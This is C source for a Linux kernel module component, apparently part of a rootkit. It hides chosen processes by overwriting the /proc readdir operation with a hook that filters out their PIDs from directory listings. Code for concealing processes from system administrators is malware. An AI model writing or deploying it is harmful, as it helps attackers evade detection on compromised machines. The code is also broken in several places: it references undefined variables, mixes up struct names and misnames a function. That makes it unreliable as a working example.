#include <linux/module.h>    /* Needed by all modules */
#include <linux/kernel.h>    /* Needed for KERN_INFO */
#include <linux/sched.h>
#include <linux/list.h>
#include <linux/proc_fs.h>

#include "sysmap.h"          /* Pointers to system functions */
#include "global.h"
#include "hide_processes.h"

// for convenience, I'm using the following notations for fun pointers:
// fun_<return type>_<arg1>_<arg2>_<arg3>_...

// for hooking the original read function
typedef int (*int_filep_voidp_filldir_t) (struct file *, void *, filldir_t);

int_filep_voidp_filldir_t proc_original_readdir;
filldir_t original_proc_fillfir;


struct proc_to_hide {
    struct proc_to_hide* next;
    int pid;
};
struct proc_to_hide *processes_to_hide = 0;
char pid_buffer[11];


int hooked_proc_filldir(void *__buf, const char *name, int namelen, loff_t offset, u64 ino, unsigned d_type){
    struct process_to_hide* cur;
    for(cur = processes_to_hide; cur != 0; cur = cur->next){
        sprintf(buf, "%d", cur->pid);
        if(strcmp(buf, name)==0){
            OUR_DEBUG("Hiding pid %s \n", char_pids_to_hide[i]);
            return 0;
        }
    }

    return original_proc_fillfir(__buf, name, namelen, offset, ino, d_type);
}

int hooked_readdir(struct file *filep, void *dirent, filldir_t filldir)
{
    original_proc_fillfir = filldir;
    return proc_original_readdir(filep, dirent, hooked_proc_filldir);
}

void load_processhiding(void)
{
    const char *myname = "hoooookMe";
    struct file_operations *proc_fops;
    struct proc_dir_entry *key = create_proc_entry(myname, 0666, NULL);
    struct proc_dir_entry *proc;

    proc = key->parent;

    remove_proc_entry(myname, proc);

    proc_fops = (struct file_operations *)proc->proc_fops;

    proc_original_readdir = proc_fops->readdir;

    make_page_writable((long unsigned int) proc_fops);

    proc_fops->readdir = hooked_readdir;
}

void hide_proc(int pid){
    struct proc_to_hide* toHide;
    if(isHidden(pid)) {
        // is already hidden, nothin to do
        return;
    }
    toHide = kmalloc(sizeof(proc_to_hide), GFP_KERNEL);
    toHide->next = 0;
    toHide->pid = pid;

    if(processes_to_hide == 0){
        processes_to_hide = toHide;
    } else {
        toHide->next = processes_to_hide;
        processes_to_hide = toHide;
    }
}

int is_hidden(int pid){
    struct proc_to_hide* cur;
    for(cur = processes_to_hide; cur != 0; cur = cur->next){
        if(cur->pid == pid) return 1;
    }
    return 0;
}

void unhide_proc(int pid){
    struct process_to_hide* last = 0;
    struct process_to_hide* cur;
    for(cur = processes_to_hide; cur != 0; cur = cur->next){
        if(cur->pid == pid){
            if(last == 0){
                processes_to_hide = cur->next;
            } else {
                last->next = cur->next;
            }
            kfree(cur);
            break;
        }
        last = cur;
    }
}

void unload_processhiding(void)
{
    struct file_operations *proc_fops = (struct file_operations *)proc->proc_fops;
    make_page_writable((long unsigned int) proc_fops);

    proc_fops->readdir = proc_original_readdir;
    make_page_readonly((long unsigned int) proc_fops);
}
